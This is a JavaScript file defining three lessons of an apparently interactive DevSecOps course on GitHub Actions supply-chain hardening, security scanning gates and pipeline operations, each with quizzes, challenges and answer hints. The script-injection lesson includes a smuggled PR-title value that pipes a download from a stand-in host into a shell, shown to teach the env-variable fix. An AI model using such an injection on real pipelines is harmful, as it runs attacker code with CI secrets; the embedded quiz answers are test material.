/* ============ 10 SUPPLY-CHAIN SECURITY ============ */
LESSONS.push({
  id: 'supply-chain', num: 10, cat: 'sec', layer: 5, mins: 16,
  title: 'Supply-Chain Security for Pipelines', short: 'Pin actions, least-privilege tokens, no injection',
  overview: `<p>A pipeline holds the keys to production, so attackers target it: a compromised third-party action, a PR title that becomes shell code, a token with write access to everything, a secret committed in YAML. Five habits close most of these doors.</p>`,
  hook: `<b>"Pin, Permit, Pass-through, Protect, Patch"</b>: pin actions, minimal permissions, pass untrusted input through env, protect secrets, patch with Dependabot.`,
  why: `Real incidents (the tj-actions/changed-files compromise, Codecov's bash uploader) leaked CI secrets from thousands of repos. Hardened workflows are a top interview topic for DevSecOps and Cloud Security roles.`,
  scene: { type: 'graph', nodes: [
    { id: 'att', x: 100, y: 240, icon: 'bug', label: 'Attacker', sub: 'fork PR · bad action' },
    { id: 'act', x: 330, y: 100, icon: 'pkg', label: 'Third-party action', sub: 'pinned @ SHA', at: 1 },
    { id: 'tok', x: 330, y: 380, icon: 'key', label: 'GITHUB_TOKEN', sub: 'contents: read', at: 2 },
    { id: 'inj', x: 580, y: 240, icon: 'terminal', label: 'run: script', sub: 'env: TITLE (safe)', at: 3 },
    { id: 'bot', x: 820, y: 100, icon: 'robot', label: 'Dependabot', sub: 'updates pins', at: 4 },
    { id: 'aws', x: 820, y: 380, icon: 'cloud', label: 'AWS', sub: 'OIDC, scoped role' }
  ], edges: [{ a: 'att', b: 'act' }, { a: 'att', b: 'tok' }, { a: 'att', b: 'inj' }, { a: 'act', b: 'bot' }, { a: 'tok', b: 'aws' }] },
  steps: [
    { t: 'The threat model', sub: 'Why pipelines get attacked',
      body: `<p>CI runners have your source, your secrets and often deploy rights. Attack paths: <b>malicious or hijacked actions</b>, <b>script injection</b> from PR titles/branch names, <b>pull_request_target</b> running fork code with secrets, <b>over-privileged tokens</b>, and <b>leaked secrets</b> in logs or YAML.</p>`,
      analogy: `The pipeline is the <b>loading dock</b>: if anyone can walk in with a box, the warehouse isn't safe however strong the front door is.`,
      hook: `<b>Whoever controls CI controls prod.</b>`,
      words: ['supply chain', 'CI secrets', 'pull_request_target', 'script injection', 'blast radius'],
      flow: { from: 'att', to: 'aws', label: 'ATTACK PATH', detail: ['fork PR → secrets → AWS'], color: 'red' }, focus: ['att', 'aws'],
      cmds: [{ c: 'gh api repos/rmctech-ai/app/actions/permissions/workflow', o: '{\n  "default_workflow_permissions": "read",\n  "can_approve_pull_request_reviews": false\n}', k: 'tool', f: 'terminal' }] },
    { t: 'Pin actions to a SHA', sub: 'Tags can move; commits can’t',
      body: `<p><code>uses: some/action@v3</code> trusts whoever controls that tag; it can be re-pointed to malicious code. A full <b>40-character commit SHA</b> is immutable: <code>uses: actions/checkout@11bd719…  # v4.2.2</code>. Never use <code>@main</code>. GitHub's own <code>actions/*</code> on a tag is a common compromise; third-party ones should be SHA-pinned.</p>`,
      analogy: `A tag is a <b>street address</b> (someone can move in); a SHA is a <b>fingerprint</b>.`,
      hook: `<b>@main never. @v4 OK for official. @SHA for third-party.</b>`,
      words: ['pin to SHA', 'mutable tag', '@main', 'allowed actions policy'],
      flow: { from: 'att', to: 'act', label: 'RE-TAG', detail: ['v3 → malicious commit (blocked by SHA pin)'], color: 'amber' }, focus: ['att', 'act'],
      cmds: [{ c: '- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2', f: 'ci.yml', o: '', k: 'yaml' }] },
    { t: 'Least-privilege GITHUB_TOKEN', sub: 'permissions: at the top',
      body: `<p>Set <code>permissions: contents: read</code> at the workflow level, then grant extras <b>per job</b> only where needed (<code>id-token: write</code> for OIDC, <code>pull-requests: write</code> to comment). Also set the repo default to read-only (Settings → Actions → Workflow permissions). <code>write-all</code> is never needed.</p>`,
      analogy: `A visitor badge that opens <b>only the meeting room</b>, not the server room.`,
      hook: `<b>Read by default, write by exception, per job.</b>`,
      words: ['permissions', 'contents: read', 'id-token: write', 'write-all', 'job-level permissions'],
      flow: { from: 'tok', to: 'aws', label: 'SCOPE', detail: ['contents: read · id-token: write (deploy job only)'], color: 'green' }, focus: ['tok'],
      cmds: [{ c: 'permissions:\n  contents: read\njobs:\n  deploy:\n    permissions:\n      contents: read\n      id-token: write', f: 'ci.yml', o: '', k: 'yaml' }] },
    { t: 'Script injection', sub: 'Untrusted input → env, not inline',
      body: `<p><code>run: echo "&#36;{{ github.event.pull_request.title }}"</code> pastes attacker text <b>into the shell script</b> before it runs. A title like <code>"; curl evil.sh | sh; "</code> executes. Fix: pass it through an environment variable, which the shell treats as data:</p><p><code>env: TITLE: &#36;{{ github.event.pull_request.title }}</code> → <code>run: echo "$TITLE"</code></p><p>Same for branch names (<code>github.head_ref</code>), issue bodies and commit messages.</p>`,
      analogy: `Reading a stranger's note <b>out loud</b> vs <b>obeying</b> it.`,
      hook: `<b>Untrusted &#36;{{ }} never inside run:. Env it.</b>`,
      words: ['script injection', 'github.event.*.title', 'head_ref', 'env indirection', 'pull_request_target'],
      flow: { from: 'att', to: 'inj', label: 'INJECT', detail: ['title: "; curl evil.sh | sh"'], color: 'red' }, focus: ['att', 'inj'],
      cmds: [{ c: '- name: Greet PR\n  env:\n    TITLE: ${{ github.event.pull_request.title }}\n  run: echo "Checking PR: $TITLE"', f: 'ci.yml', o: '', k: 'yaml' }] },
    { t: 'Secrets & Dependabot', sub: 'No keys in YAML, keep pins fresh',
      body: `<p>Never commit keys (<code>AKIA…</code>, tokens, webhooks); use OIDC for AWS and GitHub secrets for the rest, and turn on <b>secret scanning + push protection</b>. Add <code>.github/dependabot.yml</code> with <code>package-ecosystem: github-actions</code> so SHA pins and dependencies get update PRs automatically. Optional extra: <b>StepSecurity harden-runner</b> to restrict outbound network.</p>`,
      analogy: `Dependabot is the <b>maintenance crew</b> that swaps old locks for new ones without you remembering.`,
      hook: `<b>OIDC for AWS, secrets for the rest, Dependabot for freshness.</b>`,
      words: ['secret scanning', 'push protection', 'dependabot.yml', 'github-actions ecosystem', 'harden-runner'],
      flow: { from: 'bot', to: 'act', label: 'UPDATE PR', detail: ['bump actions/checkout to new SHA'], color: 'teal' }, focus: ['bot', 'act'],
      cmds: [{ c: 'version: 2\nupdates:\n  - package-ecosystem: github-actions\n    directory: /\n    schedule:\n      interval: weekly\n  - package-ecosystem: pip\n    directory: /\n    schedule:\n      interval: weekly', f: '.github/dependabot.yml', o: '', k: 'yaml' }] }
  ],
  summary: { title: 'Your pipeline is hardened', sub: 'Pin · permit · pass-through · protect · patch', text: `<p>Pin third-party actions to commit SHAs (never @main); set <code>permissions: contents: read</code> and grant more per job; pass untrusted event data through <code>env:</code>; use OIDC instead of stored keys and never commit secrets; let Dependabot keep actions and dependencies updated.</p>` },
  quiz: [
    { q: 'Safest way to reference a third-party action:', a: ['@main', '@latest', '@<full commit SHA>', 'no version'], c: 2, why: 'SHAs are immutable.' },
    { q: 'Fix script injection from a PR title:', a: ['Quote it twice', 'Pass it via env: and use "$TITLE"', 'Use pull_request_target', 'Base64 it'], c: 1, why: 'Env vars are data, not code.' },
    { q: 'Good default for GITHUB_TOKEN:', a: ['write-all', 'contents: read', 'admin', 'none possible'], c: 1, why: 'Grant more per job only.' },
    { q: 'Dependabot ecosystem that updates action pins:', a: ['npm', 'github-actions', 'docker', 'actions-pin'], c: 1, why: 'package-ecosystem: github-actions.' }
  ],
  challenge: { task: 'Harden this PR workflow until the security findings list is EMPTY and it still runs on a pull request: pin checkout to a tag (not @main), replace write-all with contents: read, move the PR title into env:, and delete the hard-coded key (it isn’t needed).',
    event: 'pull_request:main',
    hint: Y('name: PR checks', 'on:', '  pull_request:', '    branches: [main]', 'permissions:', '  contents: read', 'jobs:', '  check:', '    runs-on: ubuntu-latest', '    steps:', '      - uses: actions/checkout@v4', '      - name: Greet', '        env:', '          TITLE: ${{ github.event.pull_request.title }}', '        run: echo "Checking PR: $TITLE"', '      - run: pip install -r requirements.txt', '      - run: pytest'),
    starter: Y('name: PR checks', 'on:', '  pull_request:', '    branches: [main]', 'permissions: write-all', 'env:', '  AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE', 'jobs:', '  check:', '    runs-on: ubuntu-latest', '    steps:', '      - uses: actions/checkout@main', '      - name: Greet', '        run: echo "Checking PR: ${{ github.event.pull_request.title }}"', '      - run: pip install -r requirements.txt', '      - run: pytest'),
    check: (r, run) => { if (r.error) return r.error; const p = run('pull_request:main'); if (!p.triggered) return 'it must still run on pull_request: ' + p.reason;
      if (!RAN(p, 'check')) return 'the check job must succeed on a pull request';
      return p.findings.length ? 'still ' + p.findings.length + ' finding(s): ' + p.findings[0].msg : true; } },
  next: `The pipeline itself is hardened. Now use it to harden your <b>code</b>: SAST, dependency audits, secret scanning, IaC and container scans as automatic gates.`,
  cheat: [['uses: owner/action@<sha>  # vX', 'pin'], ['permissions: contents: read', 'least privilege'], ['env: TITLE: ${{ github.event.pull_request.title }}', 'no injection'], ['package-ecosystem: github-actions', 'Dependabot pins'], ['secret scanning + push protection', 'stop leaks'], ['avoid pull_request_target + PR checkout', 'fork safety']]
});

/* ============ 11 SECURITY GATES ============ */
LESSONS.push({
  id: 'security-gates', num: 11, cat: 'sec', layer: 5, mins: 15,
  title: 'Security Scanning Gates (DevSecOps)', short: 'SAST, deps, secrets, IaC, containers',
  overview: `<p><b>Shift left</b>: run security scanners on every pull request so problems are fixed before merge, when they're cheapest. Each scanner type catches a different class of bug; together they're the "Sec" in DevSecOps. A <b>gate</b> means the deploy job <code>needs:</code> the scans to pass.</p>`,
  hook: `<b>"Code, Deps, Secrets, Infra, Image": C-D-S-I-I, "Can Developers Ship It Insecurely? No."</b>`,
  why: `Security teams can't review every PR by hand. Automated gates scale review to every commit and produce evidence auditors love (SOC 2, ISO 27001).`,
  scene: { type: 'graph', nodes: [
    { id: 'pr', x: 100, y: 240, icon: 'code', label: 'Pull request', sub: 'src/ · infra/ · Dockerfile' },
    { id: 'sast', x: 340, y: 70, icon: 'search', label: 'SAST', sub: 'Bandit · CodeQL', at: 1 },
    { id: 'deps', x: 340, y: 190, icon: 'pkg', label: 'Dependencies', sub: 'pip-audit', at: 2 },
    { id: 'sec', x: 340, y: 310, icon: 'vault', label: 'Secrets', sub: 'gitleaks', at: 2 },
    { id: 'iac', x: 340, y: 430, icon: 'blueprint', label: 'IaC', sub: 'checkov', at: 3 },
    { id: 'gate', x: 620, y: 240, icon: 'shield', label: 'Gate', sub: 'deploy needs: security' },
    { id: 'aws', x: 860, y: 240, icon: 'cloud', label: 'Deploy', sub: 'only if clean', at: 4 }
  ], edges: [{ a: 'pr', b: 'sast' }, { a: 'pr', b: 'deps' }, { a: 'pr', b: 'sec' }, { a: 'pr', b: 'iac' }, { a: 'sast', b: 'gate' }, { a: 'deps', b: 'gate' }, { a: 'sec', b: 'gate' }, { a: 'iac', b: 'gate' }, { a: 'gate', b: 'aws' }] },
  steps: [
    { t: 'Shift left', sub: 'Cheapest fix = earliest fix',
      body: `<p>A vulnerability found in the PR costs minutes; in production it costs an incident. Scanners give developers feedback <b>in the PR</b>, with a line number, before a reviewer even looks.</p>`,
      analogy: `Spell-check while typing vs <b>recalling printed books</b>.`,
      hook: `<b>Left = early = cheap.</b>`,
      words: ['shift left', 'DevSecOps', 'PR feedback', 'security gate'],
      flow: { from: 'pr', to: 'gate', label: 'SCAN ON PR', detail: ['every push to a PR branch'], color: 'blue' }, focus: ['pr'],
      cmds: [{ c: 'on:\n  pull_request:\n    branches: [main]\n  push:\n    branches: [main]', f: 'security.yml', o: '', k: 'yaml' }] },
    { t: 'SAST: your code', sub: 'Bandit, CodeQL, Semgrep',
      body: `<p><b>Static Application Security Testing</b> reads source for dangerous patterns: SQL built from strings, <code>subprocess(shell=True)</code>, hard-coded passwords, weak crypto. <code>bandit -r src</code> for Python; <b>CodeQL</b> (free for public repos) finds deeper data-flow bugs and posts alerts to the Security tab.</p>`,
      analogy: `A <b>proofreader</b> who only looks for dangerous sentences.`,
      hook: `<b>SAST reads code without running it.</b>`,
      words: ['SAST', 'bandit', 'CodeQL', 'Semgrep', 'code scanning alerts'],
      flow: { from: 'pr', to: 'sast', label: 'SAST', detail: ['B602 subprocess call with shell=True'], color: 'purple' }, focus: ['pr', 'sast'],
      cmds: [{ c: 'bandit -r src -ll', o: '>> Issue: [B602:subprocess_popen_with_shell_equals_true] subprocess call with shell=True identified, security issue.\n   Severity: High   Confidence: High\n   Location: src/export.py:22', k: 'err', f: 'terminal' }] },
    { t: 'Dependencies & secrets', sub: 'pip-audit, Dependabot, gitleaks',
      body: `<p>Most code you ship is other people's. <b>pip-audit</b> / <code>npm audit</code> check packages against known CVEs; Dependabot opens upgrade PRs. <b>gitleaks</b> scans the diff (and history) for keys and tokens, as a backup to GitHub secret scanning.</p>`,
      analogy: `Checking the <b>recall list</b> for every ingredient you bought.`,
      hook: `<b>Audit what you import; leak-check what you commit.</b>`,
      words: ['SCA', 'pip-audit', 'CVE', 'gitleaks', 'SBOM'],
      flow: { from: 'deps', to: 'gate', label: 'CVE', detail: ['requests 2.19.0 GHSA-j8r2… → upgrade to 2.32'], color: 'amber' }, focus: ['deps', 'sec'],
      cmds: [{ c: 'pip-audit -r requirements.txt', o: 'Found 1 known vulnerability in 1 package\nName     Version ID                  Fix Versions\n-------- ------- ------------------- ------------\nrequests 2.19.0  GHSA-x84v-xcm2-53pg 2.20.0', k: 'err', f: 'terminal' }] },
    { t: 'IaC & containers', sub: 'checkov, Trivy',
      body: `<p><b>checkov -d infra</b> flags public buckets, open security groups and wildcard IAM in CloudFormation/Terraform (IaC Explorer lesson 12). <b>Trivy</b> scans container images for OS and library CVEs (CI/CD lesson 8). Use <code>--soft-fail</code> to start in report-only mode, then make it blocking.</p>`,
      analogy: `Inspecting the <b>blueprint</b> (IaC) and the <b>delivered crate</b> (image).`,
      hook: `<b>Report-only first, then block.</b>`,
      words: ['checkov', 'Trivy', 'soft-fail', 'SARIF', 'policy as code'],
      flow: { from: 'iac', to: 'gate', label: 'IaC', detail: ['CKV_AWS_24 SG allows 0.0.0.0/0:22'], color: 'red' }, focus: ['iac', 'gate'],
      cmds: [{ c: 'checkov -d infra --compact --quiet', o: 'Passed checks: 14, Failed checks: 0, Skipped checks: 0', k: 'tool', f: 'terminal' }] },
    { t: 'Make it a gate', sub: 'needs: + required checks',
      body: `<p>Put scanners in a <code>security</code> job; make <code>deploy</code> <code>needs: [test, security]</code> so a failed scan blocks deployment. In branch protection, mark <b>security</b> as a <b>required status check</b> so PRs can't merge red. Upload SARIF results so findings show inline in the PR.</p>`,
      analogy: `The <b>airport security line</b>: nobody boards without passing it.`,
      hook: `<b>needs: security + required check = real gate.</b>`,
      words: ['needs', 'required status checks', 'branch protection', 'SARIF upload'],
      flow: { from: 'gate', to: 'aws', label: 'PASS', detail: ['security ✓ test ✓ → deploy'], color: 'green' }, focus: ['gate', 'aws'],
      cmds: [{ c: 'jobs:\n  security: { ... }\n  test: { ... }\n  deploy:\n    needs: [test, security]\n    if: github.ref == \'refs/heads/main\'', f: 'ci.yml', o: '', k: 'yaml' }] }
  ],
  summary: { title: 'Security runs on every commit', sub: 'SAST · deps · secrets · IaC · images · gate', text: `<p>Run Bandit/CodeQL (code), pip-audit/Dependabot (dependencies), gitleaks (secrets), checkov (IaC) and Trivy (images) on every PR. Group them in a security job, make deploy <code>needs:</code> it, and mark it a required check so nothing insecure merges or ships.</p>` },
  quiz: [
    { q: 'Bandit and CodeQL are…', a: ['Dependency scanners', 'SAST tools', 'Container scanners', 'Secret managers'], c: 1, why: 'They analyze your source code.' },
    { q: 'pip-audit finds…', a: ['Known CVEs in Python packages', 'Open ports', 'Bad YAML', 'Slow tests'], c: 0, why: 'Software composition analysis.' },
    { q: 'Block deploys when scans fail:', a: ['continue-on-error', 'deploy needs: [security]', 'if: always()', 'a cron schedule'], c: 1, why: 'needs makes it a dependency.' },
    { q: 'Start a new scanner without breaking every build:', a: ['Disable it', 'Run in report-only (soft-fail) mode first', 'Only on Fridays', 'Skip PRs'], c: 1, why: 'Then tighten to blocking.' }
  ],
  challenge: { task: 'Add a "security" job (checkout, then pip-audit -r requirements.txt, bandit -r src, checkov -d infra) that runs on pull requests AND pushes to main, and make deploy need both test and security. On push to main all three jobs must succeed.',
    event: 'push:main',
    hint: Y('name: CI', 'on:', '  pull_request:', '    branches: [main]', '  push:', '    branches: [main]', 'permissions:', '  contents: read', 'jobs:', '  test:', '    runs-on: ubuntu-latest', '    steps:', '      - uses: actions/checkout@v4', '      - run: pip install -r requirements.txt', '      - run: pytest', '  security:', '    runs-on: ubuntu-latest', '    steps:', '      - uses: actions/checkout@v4', '      - run: pip install pip-audit bandit checkov', '      - run: pip-audit -r requirements.txt', '      - run: bandit -r src', '      - run: checkov -d infra', '  deploy:', '    needs: [test, security]', "    if: github.ref == 'refs/heads/main'", '    runs-on: ubuntu-latest', '    permissions:', '      contents: read', '      id-token: write', '    steps:', '      - uses: actions/checkout@v4', '      - uses: aws-actions/configure-aws-credentials@v4', '        with:', '          role-to-assume: arn:aws:iam::111122223333:role/github-deploy', '          aws-region: ap-southeast-1', '      - run: sam deploy --stack-name raul-app --no-confirm-changeset'),
    starter: Y('name: CI', 'on:', '  pull_request:', '    branches: [main]', '  push:', '    branches: [main]', 'permissions:', '  contents: read', 'jobs:', '  test:', '    runs-on: ubuntu-latest', '    steps:', '      - uses: actions/checkout@v4', '      - run: pip install -r requirements.txt', '      - run: pytest', '  deploy:', '    needs: test', "    if: github.ref == 'refs/heads/main'", '    runs-on: ubuntu-latest', '    permissions:', '      contents: read', '      id-token: write', '    steps:', '      - uses: actions/checkout@v4', '      - uses: aws-actions/configure-aws-credentials@v4', '        with:', '          role-to-assume: arn:aws:iam::111122223333:role/github-deploy', '          aws-region: ap-southeast-1', '      - run: sam deploy --stack-name raul-app --no-confirm-changeset'),
    check: (r, run) => { if (r.error) return r.error; const s = (r.wf.jobs || {}).security; if (!s) return 'add a job named security';
      const cmds = [].concat(s.steps || []).map(x => String((x && x.run) || '')).join('\n');
      for (const [re, name] of [[/pip-audit/, 'pip-audit -r requirements.txt'], [/bandit\s+-r/, 'bandit -r src'], [/checkov\s+-d/, 'checkov -d infra']]) if (!re.test(cmds)) return 'security job must run ' + name;
      const pr = run('pull_request:main'); if (!RAN(pr, 'security')) return 'security must run and succeed on pull requests too (did you add actions/checkout?)';
      const needs = [].concat(((r.wf.jobs.deploy || {}).needs) || []); if (!needs.includes('security') || !needs.includes('test')) return 'deploy needs: [test, security]';
      const m = run('push:main'); return ['test', 'security', 'deploy'].every(j => RAN(m, j)) ? true : 'on push to main, test, security and deploy must all succeed'; } },
  next: `Your pipeline builds, tests, scans and deploys safely. Last lesson: run it <b>like a product</b>: AWS-native CodePipeline, reusable workflows, concurrency and the DORA metrics that prove it works.`,
  cheat: [['bandit -r src', 'Python SAST'], ['github/codeql-action', 'deep SAST'], ['pip-audit -r requirements.txt', 'dependency CVEs'], ['gitleaks detect', 'secret scan'], ['checkov -d infra', 'IaC scan'], ['deploy: needs: [test, security]', 'the gate']]
});

/* ============ 12 PIPELINE OPS ============ */
LESSONS.push({
  id: 'pipeline-ops', num: 12, cat: 'ops', layer: 6, mins: 15,
  title: 'Pipeline Ops: CodePipeline, Reuse & DORA', short: 'Run CI/CD like a product',
  overview: `<p>Mature teams treat the pipeline as a product: AWS-native options (<b>CodePipeline + CodeBuild</b>) when everything must stay in AWS, <b>reusable workflows</b> instead of copy-paste, <b>concurrency</b> so two deploys never collide, timeouts and notifications, and the four <b>DORA metrics</b> to measure delivery performance.</p>`,
  hook: `<b>DORA = "Frequent, Fast, Few failures, Fixed fast"</b>: deploy frequency, lead time, change failure rate, time to restore.`,
  why: `Interviewers ask "GitHub Actions or CodePipeline?" and "how do you measure a pipeline?". Concurrency and reuse are what keep 50 repos maintainable.`,
  scene: { type: 'graph', nodes: [
    { id: 'gh', x: 110, y: 120, icon: 'code', label: 'GitHub Actions', sub: 'workflows in repo' },
    { id: 'cp', x: 110, y: 380, icon: 'pipe', label: 'CodePipeline', sub: 'Source → Build → Deploy' },
    { id: 'cb', x: 380, y: 380, icon: 'box', label: 'CodeBuild', sub: 'buildspec.yml' },
    { id: 'reuse', x: 380, y: 120, icon: 'blueprint', label: 'Reusable workflow', sub: 'workflow_call', at: 2 },
    { id: 'lock', x: 640, y: 240, icon: 'lock', label: 'Concurrency', sub: 'one deploy at a time', at: 1 },
    { id: 'dora', x: 880, y: 240, icon: 'eye', label: 'DORA metrics', sub: 'measure delivery', at: 3 }
  ], edges: [{ a: 'gh', b: 'reuse' }, { a: 'cp', b: 'cb' }, { a: 'reuse', b: 'lock' }, { a: 'cb', b: 'lock' }, { a: 'lock', b: 'dora' }] },
  steps: [
    { t: 'GitHub Actions vs CodePipeline', sub: 'Pick by where the work lives',
      body: `<p><b>GitHub Actions</b>: code is on GitHub, huge marketplace, great PR integration, OIDC into AWS. <b>CodePipeline + CodeBuild</b>: fully inside AWS (IAM roles, VPC access, CloudTrail, no external runner), common in regulated enterprises and multi-account setups. Many teams mix: GitHub for CI, CodePipeline for cross-account CD.</p>`,
      analogy: `A <b>universal remote</b> (Actions) vs the TV's <b>own remote</b> (CodePipeline): both work, one fits better in some living rooms.`,
      hook: `<b>Code on GitHub → Actions. Everything must stay in AWS → CodePipeline.</b>`,
      words: ['CodePipeline', 'CodeBuild', 'CodeDeploy', 'CodeConnections', 'cross-account'],
      flow: { from: 'cp', to: 'cb', label: 'BUILD STAGE', detail: ['Source (GitHub) → Build (CodeBuild) → Deploy (CFN)'], color: 'blue' }, focus: ['gh', 'cp'],
      cmds: [{ c: 'aws codepipeline get-pipeline-state --name raul-app --query "stageStates[].[stageName,latestExecution.status]" --output text', o: 'Source\tSucceeded\nBuild\tSucceeded\nDeploy\tInProgress', k: 'cli', f: 'terminal' }] },
    { t: 'buildspec.yml', sub: 'CodeBuild’s workflow file',
      body: `<p>CodeBuild reads <code>buildspec.yml</code>: <code>phases</code> (install, pre_build, build, post_build), <code>artifacts</code> and <code>reports</code>. It runs with the project's <b>IAM service role</b>, so no stored keys at all. Secrets come from Secrets Manager or Parameter Store via <code>env: secrets-manager:</code>.</p>`,
      analogy: `Same recipe, different <b>kitchen</b>: steps look familiar, the appliances are AWS's.`,
      hook: `<b>phases: install → pre_build → build → post_build.</b>`,
      words: ['buildspec.yml', 'phases', 'service role', 'env secrets-manager', 'artifacts'],
      flow: { from: 'cb', to: 'lock', label: 'RUN', detail: ['pytest · checkov · sam package'], color: 'purple' }, focus: ['cb'],
      cmds: [{ c: 'version: 0.2\nphases:\n  install:\n    runtime-versions:\n      python: 3.12\n    commands:\n      - pip install -r requirements.txt checkov\n  build:\n    commands:\n      - pytest\n      - checkov -d infra\n      - sam package --output-template-file packaged.yaml --s3-bucket raul-artifacts\nartifacts:\n  files: [packaged.yaml]', f: 'buildspec.yml', o: '', k: 'yaml' }] },
    { t: 'Reusable workflows', sub: 'on: workflow_call',
      body: `<p>Write the deploy logic once in <code>.github/workflows/deploy.yml</code> with <code>on: workflow_call: inputs:</code>, then call it from any repo: <code>jobs: prod: uses: rmctech-ai/pipelines/.github/workflows/deploy.yml@v1</code> with <code>with:</code> and <code>secrets: inherit</code>. <b>Composite actions</b> do the same for a group of steps. Fix a bug once, every repo benefits.</p>`,
      analogy: `A <b>company template</b> everyone fills in instead of each team writing their own contract.`,
      hook: `<b>workflow_call = function for pipelines.</b>`,
      words: ['workflow_call', 'reusable workflow', 'composite action', 'secrets: inherit', 'golden pipeline'],
      flow: { from: 'gh', to: 'reuse', label: 'CALL', detail: ['uses: rmctech-ai/pipelines/…/deploy.yml@v1'], color: 'amber' }, focus: ['gh', 'reuse'],
      cmds: [{ c: 'jobs:\n  prod:\n    uses: rmctech-ai/pipelines/.github/workflows/deploy.yml@v1\n    with:\n      stack-name: raul-app\n      environment: production\n    secrets: inherit', f: 'ci.yml', o: '', k: 'yaml' }] },
    { t: 'Concurrency & timeouts', sub: 'No collisions, no zombies',
      body: `<p>Two merges a minute apart can start two deploys that fight over the same stack. <code>concurrency: group: deploy-&#36;{{ github.ref }}</code> queues them; <code>cancel-in-progress: true</code> cancels the older run (good for CI; for prod deploys you may prefer false so a deploy is never cut mid-way). <code>timeout-minutes: 20</code> stops stuck jobs from burning minutes for 6 hours.</p>`,
      analogy: `A <b>single-lane bridge</b> with a traffic light, and a rule that stalled cars get towed.`,
      hook: `<b>concurrency for order, timeout-minutes for sanity.</b>`,
      words: ['concurrency', 'group', 'cancel-in-progress', 'timeout-minutes', 'queued run'],
      flow: { from: 'lock', to: 'dora', label: 'QUEUE', detail: ['run #42 waiting for #41'], color: 'green' }, focus: ['lock'],
      cmds: [{ c: 'concurrency:\n  group: deploy-${{ github.ref }}\n  cancel-in-progress: true\njobs:\n  deploy:\n    timeout-minutes: 20', f: 'ci.yml', o: '', k: 'yaml' }] },
    { t: 'DORA metrics', sub: 'Prove the pipeline works',
      body: `<p>The four DORA metrics: <b>deployment frequency</b> (how often), <b>lead time for changes</b> (commit → prod), <b>change failure rate</b> (% of deploys causing incidents), <b>time to restore</b> (incident → fixed). Elite teams deploy on demand with lead times under a day. Everything in this course (small PRs, tests, gates, canaries, rollback workflows) moves these numbers.</p>`,
      analogy: `A <b>fitness tracker</b> for your delivery: steps, pace, injuries, recovery.`,
      hook: `<b>Frequent, Fast, Few failures, Fixed fast.</b>`,
      words: ['DORA', 'deployment frequency', 'lead time', 'change failure rate', 'MTTR'],
      flow: { from: 'dora', to: 'gh', label: 'IMPROVE', detail: ['lead time 3d → 4h'], color: 'teal' }, focus: ['dora'],
      cmds: [{ c: 'gh run list --workflow ci.yml --branch main --status success --limit 100 --json createdAt --jq "length"', o: '87', k: 'tool', f: 'terminal' }] }
  ],
  summary: { title: 'You run CI/CD like a product', sub: 'CodePipeline · buildspec · reuse · concurrency · DORA', text: `<p>Choose GitHub Actions or CodePipeline/CodeBuild by where code and controls live. Share pipelines with reusable workflows (<code>workflow_call</code>). Use <code>concurrency</code> and <code>timeout-minutes</code> to prevent collisions and stuck jobs. Measure with DORA: deployment frequency, lead time, change failure rate, time to restore.</p>` },
  quiz: [
    { q: 'CodeBuild’s instructions file:', a: ['workflow.yml', 'buildspec.yml', 'appspec.yml', 'Jenkinsfile'], c: 1, why: 'appspec.yml is CodeDeploy.' },
    { q: 'Make a workflow callable from other repos:', a: ['on: workflow_call', 'on: repository_dispatch', 'uses: ./', 'needs:'], c: 0, why: 'Reusable workflows.' },
    { q: 'Stop two deploys running at once:', a: ['timeout-minutes', 'concurrency: group', 'continue-on-error', 'matrix'], c: 1, why: 'Same group = one at a time.' },
    { q: 'Which is a DORA metric?', a: ['Lines of code', 'Change failure rate', 'Number of YAML files', 'Runner CPU'], c: 1, why: 'Plus frequency, lead time, restore time.' }
  ],
  challenge: { task: 'Make deploys safe to trigger twice: add a top-level concurrency group that includes github.ref with cancel-in-progress: true, and give the deploy job timeout-minutes of 30 or less. It must still deploy on push to main.',
    event: 'push:main',
    hint: Y('name: Deploy', 'on:', '  push:', '    branches: [main]', 'permissions:', '  contents: read', '  id-token: write', 'concurrency:', '  group: deploy-${{ github.ref }}', '  cancel-in-progress: true', 'jobs:', '  deploy:', '    runs-on: ubuntu-latest', '    timeout-minutes: 20', '    steps:', '      - uses: actions/checkout@v4', '      - uses: aws-actions/configure-aws-credentials@v4', '        with:', '          role-to-assume: arn:aws:iam::111122223333:role/github-deploy', '          aws-region: ap-southeast-1', '      - run: sam deploy --stack-name raul-app --no-confirm-changeset'),
    starter: Y('name: Deploy', 'on:', '  push:', '    branches: [main]', 'permissions:', '  contents: read', '  id-token: write', 'jobs:', '  deploy:', '    runs-on: ubuntu-latest', '    steps:', '      - uses: actions/checkout@v4', '      - uses: aws-actions/configure-aws-credentials@v4', '        with:', '          role-to-assume: arn:aws:iam::111122223333:role/github-deploy', '          aws-region: ap-southeast-1', '      - run: sam deploy --stack-name raul-app --no-confirm-changeset'),
    check: (r, run) => { if (r.error) return r.error; const c = r.wf.concurrency;
      if (!c || typeof c !== 'object') return 'add a top-level concurrency: block with group: and cancel-in-progress:';
      if (!/github\.ref/.test(String(c.group || ''))) return 'the concurrency group should include ${{ github.ref }}';
      if (String(c['cancel-in-progress']) !== 'true') return 'set cancel-in-progress: true';
      const t = Number(((r.wf.jobs || {}).deploy || {})['timeout-minutes']); if (!t || t > 30) return 'add timeout-minutes (30 or less) to the deploy job';
      const m = run('push:main'); return RAN(m, 'deploy') ? true : 'deploy must still succeed on push to main'; } },
  next: `🎓 <b>Course complete!</b> Capstone: in your own repo, build the full pipeline (lint → test → security gate → OIDC deploy of a SAM app to dev, manual approval, prod with a canary alias) and a rollback workflow, then track your DORA numbers for two weeks. Next stop: <b>Cloud Security Explorer</b>.`,
  cheat: [['buildspec.yml phases', 'CodeBuild'], ['on: workflow_call', 'reusable workflow'], ['uses: org/repo/.github/workflows/x.yml@v1', 'call it'], ['concurrency: group: deploy-${{ github.ref }}', 'one at a time'], ['timeout-minutes: 20', 'no zombie jobs'], ['DORA: frequency · lead time · CFR · MTTR', 'measure']]
});
